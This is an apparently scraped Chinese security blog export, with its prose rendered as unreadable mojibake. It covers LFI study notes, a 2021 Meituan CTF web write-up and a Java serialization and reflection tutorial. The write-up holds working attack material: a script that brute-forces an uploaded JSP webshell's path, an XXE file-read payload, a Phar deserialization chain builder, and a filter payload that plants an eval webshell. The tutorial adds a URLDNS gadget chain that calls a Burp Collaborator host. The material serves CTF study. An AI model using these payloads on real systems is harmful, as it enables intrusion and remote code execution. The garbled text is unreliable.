ï¼Œé™¤æ­¤ä¹‹å¤–è¿˜æœ‰balsné˜Ÿä¼çš„writeupï¼Œå¤§æ¦‚çš„æ„æ€å°±æ˜¯é€šè¿‡å¯¹php-srcæºä»£ç çš„åˆ†æï¼Œå‘ç°å¯ä»¥ä½¿ç”¨compress.zip://æµä¸Šä¼ ä»»æ„æ–‡ä»¶ï¼ˆcompress.zip://httpæˆ–è€…compress.zip://ftpï¼Œå‰ææ˜¯å¼€å¯allow_url_includeï¼‰ï¼Œåœ¨æ­¤è¿‡ç¨‹ä¸­ä¼šç”Ÿæˆä¸´æ—¶æ–‡ä»¶ï¼Œç„¶åå†ç»è¿‡ä¸€ç³»åˆ—æ“ä½œä¹‹åç»•è¿‡WAFå¹¶ä¸”ä¿å­˜ä¸´æ—¶æ–‡ä»¶ï¼Œæœ€ç»ˆå®ç°RCE\næœ€åçœ‹ä¸‹æ¥å¥½åƒè¿™ä¸ªæ–¹æ³•å¹¶æ²¡æœ‰ç‰¹åˆ«çš„æƒŠè‰³ï¼Œç‰¹åˆ«æ˜¯éœ€è¦å¼€å¯allow_url_includeï¼Œè€Œè¿™ä¸ªé…ç½®phpé»˜è®¤æ˜¯å…³é—­çš„ã€‚\nå› ä¸ºè¿™ä¸ªæ–¹æ³•éœ€è¦æ­é…ç‰¹å®šçš„é…ç½®ï¼ˆnginxé…ç½®æ¼æ´å¯¼è‡´ç›®å½•éå†ï¼‰ä»¥åŠWAFï¼ˆè¿‡æ»¤\u0026lt;?ï¼‰ï¼Œæ‰€ä»¥å°±æ²¡æœ‰æŠ˜è…¾æˆ‘ä»¬å¯æ€œçš„willphpè¿›è¡Œå¤ç°äº†ã€‚\næœ€å å…¨ç¯‡æ–‡ç« æ²¡å†™ä»€ä¹ˆæ·±å…¥çš„ä¸œè¥¿ï¼Œå› ä¸ºç¡®å®æ²¡åŠæ³•å†™çš„æ¯”ä¸Šé¢é‚£äº›å¸ˆå‚…æ›´å¥½ï¼Œåªæ˜¯å•çº¯åšä¸ªè®°å½•æ–¹ä¾¿è‡ªå·±æŸ¥é˜…å§ï¼Œæ„Ÿå…´è¶£çš„å¸ˆå‚…å¯ä»¥ç‚¹å¼€å…¶ä»–å¸ˆå‚…çš„æ–‡ç« æ·±å…¥å­¦ä¹ ã€‚\nå‚è€ƒ Docker PHPè£¸æ–‡ä»¶æœ¬åœ°åŒ…å«ç»¼è¿° | ç¦»åˆ«æ­Œ (leavesongs.com)\nåˆ©ç”¨pearcmd.phpä»LFIåˆ°getshell_fengçš„åšå®¢-CSDNåšå®¢\nhxp CTF 2021 - A New Novel LFI - è·³è·³ç³– (tttang.com)\n0xbb - PHP LFI with Nginx Assistance (bierbaumer.net)\nhxp CTF 2021 - The End Of LFI? - è·³è·³ç³– (tttang.com)\nSolving \u0026ldquo;includer\u0026rsquo;s revenge\u0026rdquo; from hxp ctf 2021 without controlling any files (github.com)\nGitHub - wupco/PHP_INCLUDE_TO_SHELL_CHAR_DICT\n36c3 Web å­¦ä¹ è®°å½• (zeddyu.info)\n","date":"2022-01-10T10:10:38+08:00","permalink":"https://k1te.cn/p/lfi-%E6%96%B0%E5%A7%BF%E5%8A%BF%E5%AD%A6%E4%B9%A0/","title":"LFI æ–°å§¿åŠ¿å­¦ä¹ "},{"content":"è·Ÿç€é˜Ÿå‹å­¦åˆ°äº†ä¸å°‘ä¸œè¥¿\nHackMe éšä¾¿ä¸Šä¼ ä¸€ä¸ªä¸œè¥¿æ˜¾ç¤ºâ€œHACK! I filtered all the characters.â€ï¼Œå°è¯•ä¸Šä¼ ä¸€ä¸ªaï¼Œå‘ç°å¯ä»¥ï¼Œä¸Šä¼ aaä¸è¡Œï¼Œä¸Šä¼ a aå¯ä»¥ï¼ŒçŒœæµ‹æ˜¯å­—ç¬¦ä¸èƒ½è¿åœ¨ä¸€èµ·ï¼Œå¯ä»¥ç”¨utf-16ç»•è¿‡ï¼Œéšä¾¿æ‹¿ä¸ªjspé©¬è½¬æˆutf-16å³å¯ï¼š\nç„¶åä¸Šä¼ æˆåŠŸä¹‹åä¼šæ˜¾ç¤ºä¸€ä¸ªåœ°å€upload/1b5337d0c8ad813197b506146d8d503d/yyyyMMddhhmmssSSS.jspï¼Œåé¢hintå‡ºæ¥æ‰çŸ¥é“è¿™ä¸ªyyyyMMddhhmmssSSSæ˜¯ä¸Šä¼ æ—¶çš„æ—¶é—´æˆ³ï¼Œæœ€åçš„SSSæ˜¯æ¯«ç§’ï¼Œæˆ‘ä»¬å¯ä»¥ç®€å•å†™ä¸ªè„šæœ¬æ¥çˆ†ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 from os import name import requests import time import sys import threading def func(fname): res = requests.get(fname) if \u0026#34;Something went wrong\u0026#34; not in res.text: print(fname) sys.exit(0) url = \u0026#34;http://127.0.0.1:49154\u0026#34; file = \u0026#34;shell.jsp\u0026#34; files = {\u0026#34;file\u0026#34;: open(file, \u0026#34;rb\u0026#34;)} prev = time.strftime(\u0026#34;%Y%m%d%H%M%S\u0026#34;, time.localtime()) # prev = \u0026#34;20211212172308\u0026#34; print(prev) res = requests.post(url + \u0026#34;/UploadServlet\u0026#34;, files=files) # print(res.text) start = time.strftime(\u0026#34;%Y%m%d%H%M%S\u0026#34;, time.localtime()) print(start) for i in range(5): for j in range(1000): fname = f\u0026#34;{url}/page.jsp?file=upload/1b5337d0c8ad813197b506146d8d503d/{int(prev) + i}{str(j).zfill(3)}\u0026#34; # print(fname) thread = threading.Thread(target=func, args=(fname,)) thread.start() UpStorage ç™»å½•çš„æ—¶å€™æŠ“åŒ…ï¼Œå‘ç°ä¼ çš„æ˜¯xmlï¼Œç›´æ¥xxeè¯»æºç ï¼š\n1 2 3 4 5 \u0026lt;?xml version=\u0026#34;1.0\u0026#34;?\u0026gt; \u0026lt;!DOCTYPE convert [ \u0026lt;!ENTITY file SYSTEM \u0026#34;php://filter/read=convert.base64-encode/resource=class.php\u0026#34;\u0026gt; ]\u0026gt; \u0026lt;user\u0026gt;\u0026lt;username\u0026gt;\u0026amp;file;\u0026lt;/username\u0026gt;\u0026lt;password\u0026gt;dfsaa\u0026lt;/password\u0026gt;\u0026lt;/user\u0026gt; æ–‡ä»¶ä¸Šä¼ +LFI+classï¼Œå¾ˆå®¹æ˜“æƒ³åˆ°Pharååºåˆ—åŒ–ï¼Œexpï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 \u0026lt;?php //error_reporting(0); //$dbaddr = \u0026#34;127.0.0.1\u0026#34;; //$dbuser = \u0026#34;root\u0026#34;; //$dbpass = \u0026#34;\u0026#34;; //$dbname = \u0026#34;ctf\u0026#34;; //$db = new mysqli($dbaddr, $dbuser, $dbpass, $dbname); abstract class Users { public $db; abstract public function verify_user($username, $password); abstract public function check_user_exist($username); abstract public function add_user($username, $password); abstract protected function eval(); public function test() { $this-\u0026gt;eval(); } } class User extends Users { public $db; private $func; protected $param; public function __construct() { $this-\u0026gt;func = \u0026#34;call_user_func\u0026#34;; $this-\u0026gt;param = array(\u0026#34;Logs\u0026#34;,\u0026#34;log\u0026#34;); } protected function eval() { if (is_array($this-\u0026gt;param)) { ($this-\u0026gt;func)($this-\u0026gt;param); } else { die(\u0026#34;no!\u0026#34;); } } public function verify_user($username, $password) { // TODO: Implement verify_user() method. } public function check_user_exist($username) { // TODO: Implement check_user_exist() method. } public function add_user($username, $password) { // TODO: Implement add_user() method. } } class Welcome{ public $file; public $username; public $password; public $verify; public $greeting; public function __construct($username) { $this-\u0026gt;username = $username; $this-\u0026gt;password = \u0026#34;index.php\u0026#34;; } public function __toString(){ return $this-\u0026gt;verify-\u0026gt;verify_user($this-\u0026gt;username,$this-\u0026gt;password); } public function __wakeup(){ $this-\u0026gt;greeting = \u0026#34;Welcome \u0026#34;.$this-\u0026gt;username.\u0026#34;:)\u0026#34;; } } class File { public $filename; public $fileext; public $basename; public function __construct() { $this-\u0026gt;filename = new User(); } public function check_file_exist($filename) { if (file_exists($filename) \u0026amp;\u0026amp; !is_dir($filename)) { return true; } else { return false; } } public function __call($func, $params) { foreach($params as $param){ if($this-\u0026gt;check_file_exist($param)) { $this-\u0026gt;filename-\u0026gt;test(); } } } } class Logs { public $log; public function log() { $log = $_GET[\u0026#39;log\u0026#39;]; if(preg_match(\u0026#34;/rot13|base|toupper|encode|decode|convert|bzip2/i\u0026#34;, $log)) { die(\u0026#34;hack!\u0026#34;); } file_put_contents($log,\u0026#39;\u0026lt;?php exit();\u0026#39;.$log); } } $welcome1 = new Welcome(\u0026#34;index.php\u0026#34;); $welcome1-\u0026gt;verify = new File(); $welcome2 = new Welcome($welcome1); @unlink(\u0026#34;phar.phar\u0026#34;); $phar = new Phar(\u0026#34;phar.phar\u0026#34;); //åç¼€åå¿…é¡»ä¸ºphar $phar-\u0026gt;startBuffering(); $phar-\u0026gt;setStub(\u0026#34;\u0026lt;?php __HALT_COMPILER(); ?\u0026gt;\u0026#34;); //è®¾ç½®stub $phar-\u0026gt;setMetadata($welcome2); //å°†è‡ªå®šä¹‰çš„meta-dataå­˜å…¥manifest $phar-\u0026gt;addFromString(\u0026#34;test.txt\u0026#34;, \u0026#34;test\u0026#34;); //æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶ //ç­¾åè‡ªåŠ¨è®¡ç®— $phar-\u0026gt;stopBuffering(); logå¤„çš„æ­»äº¡exitç»•è¿‡å¯ä»¥å‚è€ƒ2020WMCTFçš„checkinï¼Œpayloadï¼šphp://filter/zlib.deflate|string.tolower|zlib.inflate|?\u0026gt;\u0026lt;?php%0deval($_GET[1]);?\u0026gt;/resource=shell.php ","date":"2021-12-13T15:51:24+08:00","permalink":"https://k1te.cn/p/2021%E7%BE%8E%E5%9B%A2%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E9%AB%98%E6%A0%A1%E6%8C%91%E6%88%98%E8%B5%9Bweb%E9%83%A8%E5%88%86wp/","title":"2021ç¾å›¢ç½‘ç»œå®‰å…¨é«˜æ ¡æŒ‘æˆ˜èµ›webéƒ¨åˆ†wp"},{"content":"Javaå…¥é—¨çš„ç®€å•åŸºç¡€ï¼ŒåŒ…æ‹¬åºåˆ—åŒ–ååºåˆ—åŒ–ã€åå°„ã€ç±»çš„åŠ¨æ€åŠ è½½ï¼ŒåŠ¨æ€ä»£ç†æš‚æ—¶è¿˜æ²¡ç”¨åˆ°ï¼Œåé¢ç”¨åˆ°å†åŠ ä¸Šã€‚\nåºåˆ—åŒ–å’Œååºåˆ—åŒ– Javaåºåˆ—åŒ–æ˜¯æŒ‡æŠŠJavaå¯¹è±¡è½¬æ¢ä¸ºå­—èŠ‚åºåˆ—çš„è¿‡ç¨‹ï¼›è€ŒJavaååºåˆ—åŒ–æ˜¯æŒ‡æŠŠå­—èŠ‚åºåˆ—æ¢å¤ä¸ºJavaå¯¹è±¡çš„è¿‡ç¨‹ã€‚\nç”¨å¤„ æƒ³æŠŠå†…å­˜ä¸­çš„å¯¹è±¡ä¿å­˜åˆ°ä¸€ä¸ªæ–‡ä»¶ä¸­æˆ–è€…æ•°æ®åº“ä¸­æ—¶å€™ï¼› æƒ³ç”¨å¥—æ¥å­—åœ¨ç½‘ç»œä¸Šä¼ é€å¯¹è±¡çš„æ—¶å€™ï¼› æƒ³é€šè¿‡RMIä¼ è¾“å¯¹è±¡çš„æ—¶å€™ å®ç° åªæœ‰å®ç°äº†Serializableæˆ–è€…Externalizableæ¥å£çš„ç±»çš„å¯¹è±¡æ‰èƒ½è¢«åºåˆ—åŒ–ä¸ºå­—èŠ‚åºåˆ—ã€‚ï¼ˆä¸æ˜¯åˆ™ä¼šæŠ›å‡ºå¼‚å¸¸ï¼‰\né€šè¿‡ ObjectOutStream åŒ…è£… FileOutStreamæˆ–è€…ByteArrayInputStream\nåŒç†ï¼Œå¯ä»¥é€šè¿‡ ObjectInputStream å°†æ•°æ®ä»ç£ç›˜ FileInputStream æˆ–è€…å†…å­˜ ByteArrayInputStream è¯»å–å‡ºæ¥ç„¶åè½¬åŒ–ä¸ºæŒ‡å®šçš„å¯¹è±¡\nObjectOutputStreamä»£è¡¨å¯¹è±¡è¾“å‡ºæµï¼š\nå®ƒçš„writeObject(Object obj)æ–¹æ³•å¯å¯¹å‚æ•°æŒ‡å®šçš„objå¯¹è±¡è¿›è¡Œåºåˆ—åŒ–ï¼ŒæŠŠå¾—åˆ°çš„å­—èŠ‚åºåˆ—å†™åˆ°ä¸€ä¸ªç›®æ ‡è¾“å‡ºæµä¸­ã€‚ ObjectInputStreamä»£è¡¨å¯¹è±¡è¾“å…¥æµï¼š\nå®ƒçš„readObject()æ–¹æ³•ä»ä¸€ä¸ªæºè¾“å…¥æµä¸­è¯»å–å­—èŠ‚åºåˆ—ï¼Œå†æŠŠå®ƒä»¬ååºåˆ—åŒ–ä¸ºä¸€ä¸ªå¯¹è±¡ï¼Œå¹¶å°†å…¶è¿”å›ã€‚ ä¾‹å­ Person.java\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 public class Person implements Serializable { private String name; private int age; public Person(){} public Person(String name, int age) { this.name = name; this.age = age; } @Override public String toString() { return \u0026#34;Person{\u0026#34; + \u0026#34;name=\u0026#39;\u0026#34; + name + \u0026#39;\\\u0026#39;\u0026#39; + \u0026#34;, age=\u0026#34; + age + \u0026#39;}\u0026#39;; } } SerializeTest.java\n1 2 3 4 5 6 7 8 9 10 11 12 13 public class SerializeTest { public static void serialize(Object obj) throws IOException{ ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream(\u0026#34;person.ser\u0026#34;)); objectOutputStream.writeObject(obj); } public static void main(String[] args) throws IOException { Person person = new Person(\u0026#34;a\u0026#34;,22); // System.out.println(person); serialize(person); } } Unserialize.java\n1 2 3 4 5 6 7 8 9 10 11 12 public class UnserializeTest { public static Object unserialize(String filename) throws IOException, ClassNotFoundException { ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream(filename)); Object obj = objectInputStream.readObject(); return obj; } public static void main(String[] args) throws IOException, ClassNotFoundException { Person person = (Person) unserialize(\u0026#34;person.ser\u0026#34;); System.out.println(person); } } å…¶ä»–éœ€è¦æ³¨æ„çš„ç‚¹ é™æ€æˆå‘˜å˜é‡æ˜¯ä¸èƒ½è¢«åºåˆ—åŒ– transient æ ‡è¯†çš„å¯¹è±¡æˆå‘˜å˜é‡ä¸å‚ä¸åºåˆ—åŒ– é‡å†™writeObjectå’ŒreadObjectæ–¹æ³• ä½¿ç”¨transientå…³é”®å­—é˜»æ­¢åºåˆ—åŒ–è™½ç„¶ç®€å•æ–¹ä¾¿ï¼Œä½†è¢«å®ƒä¿®é¥°çš„å±æ€§è¢«å®Œå…¨éš”ç¦»åœ¨åºåˆ—åŒ–æœºåˆ¶ä¹‹å¤–ï¼Œå¯¼è‡´äº†åœ¨ååºåˆ—åŒ–æ—¶æ— æ³•è·å–è¯¥å±æ€§çš„å€¼ï¼Œè€Œé€šè¿‡åœ¨éœ€è¦åºåˆ—åŒ–çš„å¯¹è±¡çš„Javaç±»é‡ŒåŠ å…¥writeObject()æ–¹æ³•ä¸readObject()æ–¹æ³•å¯ä»¥æ§åˆ¶å¦‚ä½•åºåˆ—åŒ–å„å±æ€§ï¼Œç”šè‡³å®Œå…¨ä¸åºåˆ—åŒ–æŸäº›å±æ€§æˆ–è€…åŠ å¯†åºåˆ—åŒ–æŸäº›å±æ€§ã€‚\nexample:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 public class MyList implements Serializable { private String name; /* transient è¡¨ç¤ºè¯¥æˆå‘˜ arr ä¸éœ€è¦è¢«åºåˆ—åŒ– */ private transient Object[] arr; public MyList() { } public MyList(String name) { this.name = name; this.arr = new Object[100]; /* ç»™å‰é¢30ä¸ªå…ƒç´ è¿›è¡Œåˆå§‹åŒ– */ for (int i = 0; i \u0026lt; 30; i++) { this.arr[i] = i; } } @Override public String toString() { return \u0026#34;MyList{\u0026#34; + \u0026#34;name=\u0026#39;\u0026#34; + name + \u0026#39;\\\u0026#39;\u0026#39; + \u0026#34;, arr=\u0026#34; + Arrays.toString(arr) + \u0026#39;}\u0026#39;; } //-------------------------- è‡ªå®šä¹‰åºåˆ—åŒ–ååºåˆ—åŒ– arr å…ƒç´  ------------------ /** * Save the state of the \u0026lt;tt\u0026gt;ArrayList\u0026lt;/tt\u0026gt; instance to a stream (that * is, serialize it). * * @serialData The length of the array backing the \u0026lt;tt\u0026gt;ArrayList\u0026lt;/tt\u0026gt; * instance is emitted (int), followed by all of its elements * (each an \u0026lt;tt\u0026gt;Object\u0026lt;/tt\u0026gt;) in the proper order. */ private void writeObject(java.io.ObjectOutputStream s) throws java.io.IOException { //æ‰§è¡Œ JVM é»˜è®¤çš„åºåˆ—åŒ–æ“ä½œ s.defaultWriteObject(); //æ‰‹åŠ¨åºåˆ—åŒ– arr å‰é¢30ä¸ªå…ƒç´  for (int i = 0; i \u0026lt; 30; i++) { s.writeObject(arr[i]); } } /** * Reconstitute the \u0026lt;tt\u0026gt;ArrayList\u0026lt;/tt\u0026gt; instance from a stream (that is, * deserialize it). */ private void readObject(java.io.ObjectInputStream s) throws java.io.IOException, ClassNotFoundException { s.defaultReadObject(); arr = new Object[30]; // Read in all elements in the proper order. for (int i = 0; i \u0026lt; 30; i++) { arr[i] = s.readObject(); } } } å®‰å…¨é—®é¢˜çš„äº§ç”Ÿ åªè¦æœåŠ¡ç«¯ååºåˆ—åŒ–æ•°æ®ï¼Œå®¢æˆ·ç«¯ä¼ é€’çš„ç±»çš„readObjectä¸­çš„ä»£ç å°±ä¼šè‡ªåŠ¨æ‰§è¡Œï¼Œç»™äºˆæ”»å‡»è€…åœ¨æœåŠ¡å™¨ä¸Šè¿è¡Œä»£ç çš„èƒ½åŠ›ã€‚\nå¯èƒ½çš„å½¢å¼ å…¥å£ç±»çš„readObjectç›´æ¥è°ƒç”¨å±é™©æ–¹æ³•ã€‚ å…¥å£ç±»å‚æ•°ä¸­åŒ…å«å¯æ§ç±»ï¼Œè¯¥ç±»æœ‰å±é™©æ–¹æ³•ï¼ŒreadObjectæ—¶è°ƒç”¨ã€‚ å…¥å£ç±»å‚æ•°ä¸­åŒ…å«å¯æ§ç±»ï¼Œè¯¥ç±»åˆè°ƒç”¨å…¶ä»–æœ‰å±é™©æ–¹æ³•çš„ç±»ï¼ŒreadObjectæ—¶è°ƒç”¨ã€‚ æ„é€ å‡½æ•°/é™æ€ä»£ç å—ç­‰åœ¨ç±»åŠ è½½æ—¶éšå¼æ‰§è¡Œ åˆ©ç”¨ å…¥å£ç±» é‡å†™readObject readObjectè°ƒç”¨å¸¸è§å‡½æ•° å‚æ•°ç±»å‹å®½æ³› æœ€å¥½jdkè‡ªå¸¦ è°ƒç”¨é“¾ gadget chain ç›¸åŒåç§°ï¼Œç›¸åŒç±»å‹ æ‰§è¡Œç±» URLDNS æœ€ç®€å•çš„é“¾ï¼Œæ£€æµ‹ååºåˆ—åŒ–ä½ç‚¹\n1 2 3 4 5 * Gadget Chain: * HashMap.readObject() * HashMap.putVal() * HashMap.hash() * URL.hashCode() ç„¶è€Œputçš„æ—¶å€™ç›´æ¥è°ƒç”¨äº†hashCodeï¼Œéœ€è¦é€šè¿‡åå°„æ”¹å˜å·²æœ‰å¯¹è±¡çš„å±æ€§ã€‚\næ³¨æ„ï¼Œjavaæœ‰dnsç¼“å­˜ï¼Œæ‰€ä»¥åŒä¸€ä¸ªurlï¼Œåªä¼šdnsè§£æä¸€æ¬¡ï¼Œåé¢éƒ½ä¼šç›´æ¥åœ¨ç¼“å­˜é‡Œé¢æ‰¾\næ‹“å±• Serializable æ¥å£\nä¸€ä¸ªå¯¹è±¡æƒ³è¦è¢«åºåˆ—åŒ–ï¼Œé‚£ä¹ˆå®ƒçš„ç±»å°±è¦å®ç°æ­¤æ¥å£æˆ–è€…å®ƒçš„å­æ¥å£ã€‚\nè¿™ä¸ªå¯¹è±¡çš„æ‰€æœ‰å±æ€§ï¼ˆåŒ…æ‹¬privateå±æ€§ã€åŒ…æ‹¬å…¶å¼•ç”¨çš„å¯¹è±¡ï¼‰éƒ½å¯ä»¥è¢«åºåˆ—åŒ–å’Œååºåˆ—åŒ–æ¥ä¿å­˜ã€ä¼ é€’ã€‚ä¸æƒ³åºåˆ—åŒ–çš„å­—æ®µå¯ä»¥ä½¿ç”¨transientä¿®é¥°ã€‚\nç”±äºSerializableå¯¹è±¡å®Œå…¨ä»¥å®ƒå­˜å‚¨çš„äºŒè¿›åˆ¶ä½ä¸ºåŸºç¡€æ¥æ„é€ ï¼Œå› æ­¤å¹¶ä¸ä¼šè°ƒç”¨ä»»ä½•æ„é€ å‡½æ•°ï¼Œå› æ­¤Serializableç±»æ— éœ€é»˜è®¤æ„é€ å‡½æ•°ï¼Œä½†æ˜¯å½“Serializableç±»çš„çˆ¶ç±»æ²¡æœ‰å®ç°Serializableæ¥å£æ—¶ï¼Œååºåˆ—åŒ–è¿‡ç¨‹ä¼šè°ƒç”¨çˆ¶ç±»çš„é»˜è®¤æ„é€ å‡½æ•°ï¼Œå› æ­¤è¯¥çˆ¶ç±»å¿…éœ€æœ‰é»˜è®¤æ„é€ å‡½æ•°ï¼Œå¦åˆ™ä¼šæŠ›å¼‚å¸¸ã€‚\nä½¿ç”¨transientå…³é”®å­—é˜»æ­¢åºåˆ—åŒ–è™½ç„¶ç®€å•æ–¹ä¾¿ï¼Œä½†è¢«å®ƒä¿®é¥°çš„å±æ€§è¢«å®Œå…¨éš”ç¦»åœ¨åºåˆ—åŒ–æœºåˆ¶ä¹‹å¤–ï¼Œå¯¼è‡´äº†åœ¨ååºåˆ—åŒ–æ—¶æ— æ³•è·å–è¯¥å±æ€§çš„å€¼ï¼Œè€Œé€šè¿‡åœ¨éœ€è¦åºåˆ—åŒ–çš„å¯¹è±¡çš„Javaç±»é‡ŒåŠ å…¥writeObject()æ–¹æ³•ä¸readObject()æ–¹æ³•å¯ä»¥æ§åˆ¶å¦‚ä½•åºåˆ—åŒ–å„å±æ€§ï¼Œç”šè‡³å®Œå…¨ä¸åºåˆ—åŒ–æŸäº›å±æ€§æˆ–è€…åŠ å¯†åºåˆ—åŒ–æŸäº›å±æ€§ã€‚\nExternalizable æ¥å£\nå®ƒæ˜¯Serializableæ¥å£çš„å­ç±»ï¼Œç”¨æˆ·è¦å®ç°çš„writeExternal()å’ŒreadExternal() æ–¹æ³•ï¼Œç”¨æ¥å†³å®šå¦‚ä½•åºåˆ—åŒ–å’Œååºåˆ—åŒ–ã€‚\nå› ä¸ºåºåˆ—åŒ–å’Œååºåˆ—åŒ–æ–¹æ³•éœ€è¦è‡ªå·±å®ç°ï¼Œå› æ­¤å¯ä»¥æŒ‡å®šåºåˆ—åŒ–å“ªäº›å±æ€§ï¼Œè€Œtransientåœ¨è¿™é‡Œæ— æ•ˆã€‚\nå¯¹Externalizableå¯¹è±¡ååºåˆ—åŒ–æ—¶ï¼Œä¼šå…ˆè°ƒç”¨ç±»çš„æ— å‚æ„é€ æ–¹æ³•ï¼Œè¿™æ˜¯æœ‰åˆ«äºé»˜è®¤ååºåˆ—æ–¹å¼çš„ã€‚å¦‚æœæŠŠç±»çš„ä¸å¸¦å‚æ•°çš„æ„é€ æ–¹æ³•åˆ é™¤ï¼Œæˆ–è€…æŠŠè¯¥æ„é€ æ–¹æ³•çš„è®¿é—®æƒé™è®¾ç½®ä¸ºprivateã€é»˜è®¤æˆ–protectedçº§åˆ«ï¼Œä¼šæŠ›å‡ºjava.io.InvalidException: no valid constructorå¼‚å¸¸ï¼Œå› æ­¤Externalizableå¯¹è±¡å¿…é¡»æœ‰é»˜è®¤æ„é€ å‡½æ•°ï¼Œè€Œä¸”å¿…éœ€æ˜¯publicçš„ã€‚\nåå°„ Java çš„åå°„æœºåˆ¶æ˜¯æŒ‡åœ¨è¿è¡ŒçŠ¶æ€ä¸­ï¼Œå¯¹äºä»»æ„ä¸€ä¸ªç±»éƒ½èƒ½å¤ŸçŸ¥é“è¿™ä¸ªç±»æ‰€æœ‰çš„å±æ€§å’Œæ–¹æ³•ï¼› å¹¶ä¸”å¯¹äºä»»æ„ä¸€ä¸ªå¯¹è±¡ï¼Œéƒ½èƒ½å¤Ÿè°ƒç”¨å®ƒçš„ä»»æ„ä¸€ä¸ªæ–¹æ³•ï¼›è¿™ç§åŠ¨æ€è·å–ä¿¡æ¯ä»¥åŠåŠ¨æ€è°ƒç”¨å¯¹è±¡æ–¹æ³•çš„åŠŸèƒ½æˆä¸ºJavaè¯­è¨€çš„åå°„æœºåˆ¶ã€‚\næ€»çš„æ¥æ—¶ï¼Œåå°„èµ‹äºˆJavaåŠ¨æ€ç‰¹æ€§\nåå°„çš„åŸºæœ¬ä½¿ç”¨ è·å–Classå¯¹è±¡ ä½¿ç”¨Class.forName é™æ€æ–¹æ³•\n1 Class class1 = Class.forName(\u0026#34;Person\u0026#34;); ä½¿ç”¨ç±»çš„.classé™æ€å±æ€§\n1 Class class2 = Person.class; ä½¿ç”¨å®ä¾‹å¯¹è±¡çš„getClass()æ–¹æ³•\n1 2 Person person = new Person(); Class class3 = person.getClass(); é€šè¿‡ClassLoaderè·å–\n1 2 ClassLoader systemClassLoader = ClassLoader.getSystemClassLoader(); Class\u0026lt;?\u0026gt; c = systemClassLoader.loadClass(\u0026#34;Person\u0026#34;); åˆ›é€ å®ä¾‹å¯¹è±¡ é€šè¿‡Classçš„newInstance()æ–¹æ³• é€šè¿‡Constructorçš„newInstance()æ–¹æ³• 1 2 3 4 5 6 7 8 9 //æ–¹å¼ä¸€ Class class1 = Class.forName(\u0026#34;reflection.Student\u0026#34;); Student student = (Student) class1.newInstance(); System.out.println(student); //æ–¹å¼äºŒ Constructor constructor = class1.getConstructor(); Student student1 = (Student) constructor.newInstance(); System.out.println(student1); æ–¹æ³•ä¸€åªèƒ½è°ƒç”¨æ— å‚æ„é€ å‡½æ•°ï¼Œä¸€èˆ¬ä¸ç”¨\nè·å–ç±»çš„æˆå‘˜å˜é‡ 1 2 3 4 getField() getDeclaredField() getFields() getDeclaredFields() ä¿®æ”¹æˆå‘˜å˜é‡ 1 Field.set(Object obj,Object value) å¦‚ä½•ä¿®æ”¹ç§æœ‰å˜é‡ï¼Ÿ\n1 Field.setAccessible(true); è·å–ç±»çš„æ–¹æ³• 1 2 3 4 getMethod(String name, Class\u0026lt;?\u0026gt;... parameterTypes) getMethods() getDeclaredMethod() getDeclaredMethods() è°ƒç”¨ç±»çš„æ–¹æ³• 1 invoke(Object obj, Object... args) setAccessibleåŒç†\nå›åˆ°URLDNS putä¹‹å‰ä¿®æ”¹hashCodeå±æ€§ä¸ä¸º-1ï¼›putä¹‹åï¼Œååºåˆ—åŒ–ä¹‹å‰ä¿®æ”¹hashCodeå±æ€§ä¸º-1\n1 2 3 4 5 6 7 8 9 HashMap\u0026lt;URL,Integer\u0026gt; hashMap = new HashMap\u0026lt;\u0026gt;(); URL url = new URL(\u0026#34;http://y21jgo6y2e6rmwv062dgrkf2ctik69.burpcollaborator.net\u0026#34;); Class c = url.getClass(); Field hashCodeField = c.getDeclaredField(\u0026#34;hashCode\u0026#34;); hashCodeField.setAccessible(true); hashCodeField.set(url,123); hashMap.put(url,1); hashCodeField.set(url,-1); serialize(hashMap); åº”ç”¨ å®šåˆ¶éœ€è¦çš„å¯¹è±¡ é€šè¿‡invokeè°ƒç”¨é™¤äº†åŒåå‡½æ•°ä¹‹å¤–çš„å‡½æ•° é€šè¿‡Classç±»åˆ›å»ºå¯¹è±¡ï¼Œå¼•å…¥ä¸èƒ½åºåˆ—åŒ–çš„ç±» ç±»çš„åŠ¨æ€åŠ è½½ ç±»çš„åŠ è½½æœºåˆ¶ Javaè™šæ‹ŸæœºæŠŠæè¿°ç±»çš„æ•°æ®ä»Classæ–‡ä»¶åŠ è½½åˆ°å†…å­˜ï¼Œå¹¶å¯¹æ•°æ®è¿›è¡Œæ ¡éªŒã€è½¬æ¢è§£æå’Œåˆå§‹åŒ–ï¼Œæœ€ç»ˆå½¢æˆå¯ä»¥è¢«è™šæ‹Ÿæœºç›´æ¥ä½¿ç”¨çš„Javaç±»å‹ï¼Œè¿™ä¸ªè¿‡ç¨‹è¢«ç§°ä½œè™šæ‹Ÿæœºçš„ç±»åŠ è½½æœºåˆ¶ã€‚\nç±»çš„ç”Ÿå‘½å‘¨æœŸ ç±»ä»è¢«åŠ è½½åˆ°è™šæ‹Ÿæœºå†…å­˜ä¸­å¼€å§‹ï¼Œåˆ°å¸è½½å‡ºå†…å­˜ä¸ºæ­¢ï¼Œå®ƒçš„æ•´ä¸ªç”Ÿå‘½å‘¨æœŸåŒ…æ‹¬ï¼šåŠ 